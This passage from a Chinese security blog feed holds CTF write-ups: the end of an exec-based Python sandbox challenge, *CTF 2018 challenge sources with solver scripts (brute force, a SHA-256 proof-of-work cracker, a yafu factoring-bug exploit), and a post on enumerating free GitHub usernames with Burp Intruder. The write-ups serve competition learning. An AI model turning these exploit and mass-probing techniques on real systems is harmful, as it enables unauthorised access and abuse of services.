input_filter(inp)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">exec</span> cmd</span><br><span class="line">    <span class="keyword">except</span> NameError, e:</span><br><span class="line">        <span class="keyword">print</span> <span class="string">"wow something lose!We can\'t find it !  D:"</span></span><br><span class="line">    <span class="keyword">except</span> SyntaxError,e:</span><br><span class="line">        <span class="keyword">print</span> <span class="string">"Noob! Synax Wrong! :("</span></span><br><span class="line">    <span class="keyword">except</span> Exception,e:</span><br><span class="line">        <span class="keyword">print</span> <span class="string">"unknow error,try again  :&gt;"</span></span><br></pre></td></tr></table></figure><p>/home/ctf/bin</p><p><img src="1525027843540.png" alt="1525027843540"></p><h1 id="题目备份"><a href="#题目备份" class="headerlink" title="题目备份"></a>题目备份</h1><p><a href="https://github.com/findneo/ctfgodown/tree/master/20180430-ciscn" target="_blank" rel="noopener">https://github.com/findneo/ctfgodown/tree/master/20180430-ciscn</a></p>]]></content>
      
      
      
    </entry>
    
    <entry>
      <title>starctf writeup</title>
      <link href="/180426starctf/"/>
      <url>/180426starctf/</url>
      
        <content type="html"><![CDATA[<h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><h2 id="simpleweb"><a href="#simpleweb" class="headerlink" title="simpleweb"></a>simpleweb</h2><p>nc 47.75.4.252 23333</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> net = <span class="built_in">require</span>(<span class="string">'net'</span>);</span><br><span class="line"></span><br><span class="line">flag=<span class="string">'fake_flag'</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> server = net.createServer(<span class="function"><span class="keyword">function</span>(<span class="params">socket</span>) </span>&#123;</span><br><span class="line">socket.on(<span class="string">'data'</span>, (data) =&gt; &#123; </span><br><span class="line"><span class="comment">//m = data.toString().replace(/[\n\r]*$/, '');</span></span><br><span class="line">ok = <span class="literal">true</span>;</span><br><span class="line">arr = data.toString().split(<span class="string">' '</span>);</span><br><span class="line">arr = arr.map(<span class="built_in">Number</span>);</span><br><span class="line"><span class="keyword">if</span> (arr.length != <span class="number">5</span>) </span><br><span class="line">ok = <span class="literal">false</span>;</span><br><span class="line">arr1 = arr.slice(<span class="number">0</span>);</span><br><span class="line">arr1.sort();</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">var</span> i=<span class="number">0</span>; i&lt;<span class="number">4</span>; i++)</span><br><span class="line"><span class="keyword">if</span> (arr1[i+<span class="number">1</span>] == arr1[i] || arr[i] &lt; <span class="number">0</span> || arr1[i+<span class="number">1</span>] &gt; <span class="number">127</span>)</span><br><span class="line">ok = <span class="literal">false</span>;</span><br><span class="line">arr2 = []</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">var</span> i=<span class="number">0</span>; i&lt;<span class="number">4</span>; i++)</span><br><span class="line">arr2.push(arr1[i] + arr1[i+<span class="number">1</span>]);</span><br><span class="line">val = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">var</span> i=<span class="number">0</span>; i&lt;<span class="number">4</span>; i++)</span><br><span class="line">val = val * <span class="number">0x100</span> + arr2[i];</span><br><span class="line"><span class="keyword">if</span> (val != <span class="number">0x23332333</span>)</span><br><span class="line">ok = <span class="literal">false</span>;</span><br><span class="line"><span class="keyword">if</span> (ok)</span><br><span class="line">socket.write(flag+<span class="string">'\n'</span>);</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">socket.write(<span class="string">'nope\n'</span>);</span><br><span class="line">&#125;);</span><br><span class="line"><span class="comment">//socket.write('Echo server\r\n');</span></span><br><span class="line"><span class="comment">//socket.pipe(socket);</span></span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">HOST = <span class="string">'0.0.0.0'</span></span><br><span class="line">PORT = <span class="number">23333</span></span><br><span class="line"></span><br><span class="line">server.listen(PORT, HOST);</span><br></pre></td></tr></table></figure><p>本地爆破出符合程序判断的数字串，然后使用socket提交：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># understand JavaScript Code</span></span><br><span class="line"><span class="comment"># var arr = [22,12,3,43,56,47,4];</span></span><br><span class="line"><span class="comment"># arr.sort();</span></span><br><span class="line"><span class="comment"># console.log(arr);//[12, 22, 3, 4, 43, 47, 56] </span></span><br><span class="line"><span class="comment"># console.log(arr.slice(0));//[12, 22, 3, 4, 43, 47, 56]</span></span><br><span class="line">u=<span class="number">128</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">aLSSb</span><span class="params">(a,b)</span>:</span></span><br><span class="line"><span class="keyword">return</span> str(a)&lt;str(b)</span><br><span class="line"><span class="keyword">for</span> i0 <span class="keyword">in</span> xrange(<span class="number">0x00</span>,u):</span><br><span class="line"><span class="keyword">for</span> i1 <span class="keyword">in</span> xrange(<span class="number">0x00</span>,u):</span><br><span class="line"><span class="keyword">if</span> aLSSb(i0,i1) <span class="keyword">and</span> i0+i1 == <span class="number">0x23</span>:</span><br><span class="line"><span class="keyword">for</span> i2 <span class="keyword">in</span> xrange(<span class="number">0x00</span>,u):</span><br><span class="line"><span class="keyword">if</span> aLSSb(i1,i2) <span class="keyword">and</span> i1+i2==<span class="number">0x33</span>:</span><br><span class="line"><span class="keyword">for</span> i3 <span class="keyword">in</span> xrange(<span class="number">0x00</span>,u):</span><br><span class="line"><span class="keyword">if</span> aLSSb(i2,i3) <span class="keyword">and</span> i2+i3==<span class="number">0x23</span>:</span><br><span class="line"><span class="keyword">for</span> i4 <span class="keyword">in</span> xrange(<span class="number">0x00</span>,u):</span><br><span class="line"><span class="keyword">if</span> aLSSb(i3,i4) <span class="keyword">and</span> i3+i4==<span class="number">0x33</span>:</span><br><span class="line">r=[i0,i1,i2,i3,i4]</span><br><span class="line"><span class="keyword">print</span> r</span><br><span class="line">data_send=<span class="string">' '</span>.join((map(str,r)))</span><br><span class="line"></span><br><span class="line"><span class="comment">#[15, 20, 31, 4, 47]</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line">s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">s.connect((<span class="string">'47.75.4.252'</span>, <span class="number">23333</span>))</span><br><span class="line">s.send(data_send)</span><br><span class="line"><span class="keyword">print</span> <span class="string">"send: "</span>, data_send</span><br><span class="line"><span class="keyword">print</span> <span class="string">"wait for a while here..........."</span></span><br><span class="line">buffer = []</span><br><span class="line"><span class="keyword">while</span> <span class="keyword">True</span>:</span><br><span class="line">    d = s.recv(<span class="number">1024</span>)</span><br><span class="line">    <span class="keyword">if</span> d:</span><br><span class="line">        buffer.append(d)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">data = <span class="string">''</span>.join(buffer)</span><br><span class="line"><span class="keyword">print</span> <span class="string">"rcev: "</span>,data</span><br><span class="line">s.close()</span><br><span class="line"><span class="comment"># *ctf&#123;web_chal_made_by_binary_players_lol&#125;</span></span><br></pre></td></tr></table></figure><h1 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h1><h2 id="yafu"><a href="#yafu" class="headerlink" title="yafu"></a>yafu</h2><blockquote><p>nc 47.75.4.252 10004</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python3</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> random,sys</span><br><span class="line"><span class="keyword">import</span> socketserver</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> hmac,hashlib</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> sha256</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> isPrime</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">from</span> subprocess <span class="keyword">import</span> run, PIPE, TimeoutExpired</span><br><span class="line"><span class="keyword">from</span> flag <span class="keyword">import</span> FLAG</span><br><span class="line"></span><br><span class="line">basedir = <span class="string">'/home/sixstars/*ctf/yafu/yafu-1.34'</span></span><br><span class="line">cmd = basedir+<span class="string">'/yafu'</span></span><br><span class="line">timelimit = <span class="number">2</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">do_init</span><span class="params">()</span>:</span></span><br><span class="line">    url = <span class="string">'https://sourceforge.net/projects/yafu/files/1.34/yafu-1.34.zip/download'</span></span><br><span class="line">    <span class="keyword">if</span> os.path.isfile(cmd):</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    os.system(<span class="string">"wget %s -O %s/yafu-1.34.zip"</span> % (url, basedir))</span><br><span class="line">    os.system(<span class="string">"unzip %s/yafu-1.34.zip -d %s/"</span> % (basedir, basedir))</span><br><span class="line">    os.system(<span class="string">"chmod +x %s"</span> % (cmd))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">do_factor</span><span class="params">(num)</span>:</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        res = run(cmd, stdout=PIPE, input=(<span class="string">'factor(%d)'</span>%num).encode(), timeout=timelimit)</span><br><span class="line">    <span class="keyword">except</span> TimeoutExpired:</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">False</span></span><br><span class="line">    tmp = res.stdout.decode()</span><br><span class="line">    tmp = tmp[tmp.find(<span class="string">'***factors found***\n\n'</span>)+<span class="number">21</span>:].split(<span class="string">'\n'</span>)</span><br><span class="line">    <span class="keyword">for</span> line <span class="keyword">in</span> tmp:</span><br><span class="line">        pos = line.find(<span class="string">' = '</span>)</span><br><span class="line">        <span class="keyword">if</span> pos == <span class="number">-1</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        factor = int(line[pos+<span class="number">3</span>:])</span><br><span class="line">        <span class="keyword">if</span> line[<span class="number">0</span>] == <span class="string">'P'</span> <span class="keyword">and</span> <span class="keyword">not</span> isPrime(factor):</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">True</span></span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">False</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Task</span><span class="params">(socketserver.BaseRequestHandler)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">proof_of_work</span><span class="params">(self)</span>:</span></span><br><span class="line">        proof = <span class="string">''</span>.join([random.choice(string.ascii_letters+string.digits) <span class="keyword">for</span> _ <span class="keyword">in</span> range(<span class="number">20</span>)])</span><br><span class="line">        print(proof)</span><br><span class="line">        digest = sha256(proof.encode(<span class="string">'ascii'</span>)).hexdigest()</span><br><span class="line">        self.request.send(str.encode(<span class="string">"sha256(XXXX+%s) == %s\n"</span> % (proof[<span class="number">4</span>:],digest)))</span><br><span class="line">        self.request.send(str.encode(<span class="string">'Give me XXXX:'</span>))</span><br><span class="line">        x = self.request.recv(<span class="number">10</span>).decode()</span><br><span class="line">        x = x.strip()</span><br><span class="line">        wtfpy3 = x+proof[<span class="number">4</span>:]</span><br><span class="line">        <span class="keyword">if</span> len(x) != <span class="number">4</span> <span class="keyword">or</span> sha256(wtfpy3.encode(<span class="string">'ascii'</span>)).hexdigest() != digest: </span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">False</span></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">True</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">handle</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> self.proof_of_work():</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line">        do_init()</span><br><span class="line">        self.request.sendall(str.encode(<span class="string">"No bruteforce required. Do not DOS plz &gt;_&lt;\n"</span>))</span><br><span class="line">        self.request.sendall(str.encode(<span class="string">"The number to factorize: "</span>))</span><br><span class="line">        x = self.request.recv(<span class="number">1024</span>)</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            x = int(x, <span class="number">16</span>)</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line">        <span class="keyword">if</span> do_factor(x):</span><br><span class="line">            self.request.sendall(str.encode(<span class="string">"What happened? Anyway your flag here: %s\n"</span> % FLAG))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            self.request.sendall(str.encode(<span class="string">"Bye\n"</span>))</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ThreadedServer</span><span class="params">(socketserver.ThreadingMixIn, socketserver.TCPServer)</span>:</span></span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    HOST, PORT = <span class="string">'0.0.0.0'</span>, <span class="number">10004</span></span><br><span class="line">    print(HOST)</span><br><span class="line">    print(PORT)</span><br><span class="line">    server = ThreadedServer((HOST, PORT), Task)</span><br><span class="line">    server.allow_reuse_address = <span class="keyword">True</span></span><br><span class="line">    server.serve_forever()</span><br></pre></td></tr></table></figure><h3 id="solution"><a href="#solution" class="headerlink" title="solution"></a>solution</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> itertools</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">crack_sha256</span><span class="params">(data_part,hash)</span>:</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> itertools.product(string.ascii_letters+string.digits,repeat=<span class="number">4</span>):</span><br><span class="line">        <span class="keyword">if</span> hashlib.sha256(<span class="string">''</span>.join(i)+data_part).hexdigest()==hash:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">''</span>.join(i).strip()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get</span><span class="params">(s)</span>:</span></span><br><span class="line">    buffer = []</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">while</span> <span class="keyword">True</span>:</span><br><span class="line">            d = s.recv(<span class="number">10</span>)</span><br><span class="line">            <span class="keyword">if</span> d:</span><br><span class="line">                buffer.append(d)</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        data = <span class="string">''</span>.join(buffer)</span><br><span class="line">        <span class="keyword">return</span> data</span><br><span class="line"></span><br><span class="line">socket.setdefaulttimeout(<span class="number">2</span>)</span><br><span class="line">s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">s.connect((<span class="string">'47.75.4.252'</span>, <span class="number">10004</span>))</span><br><span class="line"><span class="comment"># ------------</span></span><br><span class="line">proof_din=get(s)</span><br><span class="line"><span class="keyword">print</span> proof_din</span><br><span class="line">r=re.findall(<span class="string">"sha256\(XXXX\+([0-9a-zA-Z]&#123;16&#125;)\) == ([0-9a-z]&#123;64&#125;)"</span>,proof_din)</span><br><span class="line"><span class="comment"># print r</span></span><br><span class="line">proof_part,sha_value=r[<span class="number">0</span>][<span class="number">0</span>],r[<span class="number">0</span>][<span class="number">1</span>]</span><br><span class="line"><span class="comment"># print proof_part,sha_value</span></span><br><span class="line">proof_part_0=crack_sha256(proof_part,sha_value)</span><br><span class="line">s.send(proof_part_0)</span><br><span class="line"><span class="keyword">print</span> <span class="string">"XXXX is %s"</span>%proof_part_0</span><br><span class="line"><span class="comment"># ------------</span></span><br><span class="line"><span class="keyword">print</span> get(s)</span><br><span class="line">s.send(<span class="string">'286b7fb2af5f5d27d216771c90ac6f43a9892a690c48e4b06bcbc1cd'</span>)</span><br><span class="line"><span class="keyword">print</span> get(s)</span><br></pre></td></tr></table></figure><h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p><a href="https://github.com/sixstars/starctf2018/blob/master/misc-yafu/README.md" target="_blank" rel="noopener">https://github.com/sixstars/starctf2018/blob/master/misc-yafu/README.md</a></p><blockquote><p>When yafu delete factors, it fails to update the factor type correctly. So it’s possible to fool yafu if you use a smooth number which consists of many small primes. Follow the link in <code>solve.py</code> for more details.</p><p>I expect someone would find it when feeding some special cases (like the smooth number as mentioned above) towards yafu. But maybe most players instead focused on the prime test. I released a hint (<em>yafu can be wrong</em>) but seems (as xdd suggested) they just turned to prime test inside yafu lol.</p></blockquote><p><img src="1525069115392.png" alt="1525069115392"></p><h1 id="题目备份"><a href="#题目备份" class="headerlink" title="题目备份"></a>题目备份</h1><p><a href="https://github.com/sixstars/starctf2018" target="_blank" rel="noopener">https://github.com/sixstars/starctf2018</a></p>]]></content>
      
      
      
    </entry>
    
    <entry>
      <title>GitHub 可用短ID</title>
      <link href="/180419GithubNiceID/"/>
      <url>/180419GithubNiceID/</url>
      
        <content type="html"><![CDATA[<p>做了件无聊的事，做完发现有人做过了（<a href="https://www.v2ex.com/t/401615" target="_blank" rel="noopener">https://www.v2ex.com/t/401615</a> ） ，记录一下。</p><p>GitHub用户名要求是</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Username may only contain alphanumeric characters or single hyphens, and cannot begin or end with a hyphen</span><br></pre></td></tr></table></figure><p>也就是满足正则 <code>^[0-9a-zA-Z]$|[0-9a-zA-Z][-0-9a-zA-Z]*[0-9a-zA-Z]</code>  ，</p><p>因为大小写不敏感，所以相当于 <code>^[0-9a-z]$|[0-9a-z][-0-9a-z]*[0-9a-z]</code> </p><p>产生一位和两位的符合GitHub命名要求的名字</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> itertools</span><br><span class="line"></span><br><span class="line">f=open(<span class="string">"GithubName12.txt"</span>,<span class="string">'w+'</span>)</span><br><span class="line">a=string.lowercase +string.digits+<span class="string">'-'</span></span><br><span class="line">tmp=[]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> xrange(<span class="number">1</span>,<span class="number">3</span>):</span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> itertools.product(a,repeat=i):</span><br><span class="line">name=<span class="string">''</span>.join(j)</span><br><span class="line"><span class="keyword">if</span> j[<span class="number">0</span>]==<span class="string">'-'</span> <span class="keyword">or</span> j[<span class="number">-1</span>]==<span class="string">'-'</span>:</span><br><span class="line"><span class="keyword">continue</span></span><br><span class="line">tmp.append(name)</span><br><span class="line">f.write(<span class="string">'\n'</span>.join(tmp))</span><br></pre></td></tr></table></figure><p>产生三位的符合GitHub命名要求的名字</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> itertools</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"></span><br><span class="line">f=open(<span class="string">"GithubName3.txt"</span>,<span class="string">'w+'</span>)</span><br><span class="line">a=string.lowercase +string.digits+<span class="string">'-'</span></span><br><span class="line">tmp=[]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> xrange(<span class="number">3</span>,<span class="number">4</span>):</span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> itertools.product(a,repeat=i):</span><br><span class="line">name=<span class="string">''</span>.join(j)</span><br><span class="line"><span class="keyword">if</span> j[<span class="number">0</span>]==<span class="string">'-'</span> <span class="keyword">or</span> j[<span class="number">-1</span>]==<span class="string">'-'</span>:</span><br><span class="line"><span class="keyword">continue</span></span><br><span class="line">tmp.append(name)</span><br><span class="line">random.shuffle(tmp)</span><br><span class="line">f.write(<span class="string">'\n'</span>.join(tmp)+<span class="string">'\n'</span>)</span><br></pre></td></tr></table></figure><p>然后用burp的intruder跑就可以了，404为用户名未被占用。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">HEAD /$asdf$ HTTP/1.1</span><br><span class="line">Host: github.com</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:54.0) Gecko/20100101 Firefox/54.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,en-US;q=0.7,en;q=0.3</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Connection: close</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br></pre></td></tr></table></figure><p>实测未被占用的名字未必都可用，比如一/二个字母的基本上都不能用了。</p><p>一位长的名字只有 <code>w</code> 未被使用，但实际修改名字时响应为<code>Login name &#39;w&#39; is a reserved word</code> </p><p>两位长的倒是颇多，但也都不可用，响应均为 <code>Login is already taken</code> </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">06</span> <span class="number">0</span>e <span class="number">0</span>t <span class="number">0</span>y <span class="number">2</span>e <span class="number">2l</span> <span class="number">2</span>n <span class="number">2</span>v <span class="number">3u</span> <span class="number">4</span>j <span class="number">4</span>r <span class="number">4</span>t <span class="number">4</span>y <span class="number">5b</span> <span class="number">5f</span> <span class="number">5</span>h <span class="number">5</span>j <span class="number">5</span>n <span class="number">5</span>q <span class="number">5</span>t <span class="number">5u</span> <span class="number">5</span>z <span class="number">6</span>e <span class="number">6</span>i <span class="number">6</span>j <span class="number">6l</span> <span class="number">6</span>m <span class="number">6</span>n <span class="number">6</span>o <span class="number">6</span>p <span class="number">6</span>r <span class="number">6</span>y <span class="number">7</span>j <span class="number">7</span>p <span class="number">7</span>y <span class="number">8</span>a <span class="number">8</span>n <span class="number">8</span>y <span class="number">96</span> <span class="number">9</span>e <span class="number">9</span>g <span class="number">9</span>j <span class="number">9</span>w <span class="number">9</span>y j3 m6 n5 u6 y4  y6 y9</span><br></pre></td></tr></table></figure><p>三位长的就很多了，部分结果放在 <a href="https://github.com/findneo/scripts/blob/master/attaches/Github%E5%8F%AF%E7%94%A8%E7%9F%ADID%5Bupto201804%5D/GithubNiceID.txt" target="_blank" rel="noopener">GIthub</a> 上了，其中不乏一些靓号：）</p><p>但也有一些是保留字或者被使用过，如</p><p><code>Login name &#39;api&#39; is a reserved word</code>  </p><p><code>Login name &#39;ssh&#39; is a reserved word</code> </p><p> <code>see ,Login is already taken</code> </p><p><code>vxv, Login is already taken</code> </p><p>…</p><p>提取出其中全字母或全数字的名字：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> string</span><br><span class="line">a=string.lowercase</span><br><span class="line">a=string.digits</span><br><span class="line">r=[]</span><br><span class="line"><span class="keyword">with</span> open(<span class="string">'final.txt'</span>) <span class="keyword">as</span> f:</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> f.readlines():</span><br><span class="line"><span class="keyword">if</span> i[<span class="number">0</span>] <span class="keyword">in</span> a <span class="keyword">and</span> i[<span class="number">1</span>] <span class="keyword">in</span> a <span class="keyword">and</span> i[<span class="number">2</span>] <span class="keyword">in</span> a:</span><br><span class="line">r.append(i.strip())</span><br><span class="line"><span class="keyword">print</span> <span class="string">' '</span>.join(r)</span><br></pre></td></tr></table></figure><p>结果：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">049</span> <span class="number">061</span> <span class="number">065</span> <span class="number">067</span> <span class="number">082</span> <span class="number">087</span> <span class="number">115</span> <span class="number">116</span> <span class="number">144</span> <span class="number">158</span> <span class="number">185</span> <span class="number">211</span> <span class="number">214</span> <span class="number">232</span> <span class="number">249</span> <span class="number">258</span> <span class="number">279</span> <span class="number">302</span> <span class="number">362</span> <span class="number">363</span> <span class="number">378</span> <span class="number">379</span> <span class="number">387</span> <span class="number">401</span> <span class="number">402</span> <span class="number">405</span> <span class="number">406</span> <span class="number">408</span> <span class="number">409</span> <span class="number">410</span> <span class="number">411</span> <span class="number">412</span> <span class="number">413</span> <span class="number">414</span> <span 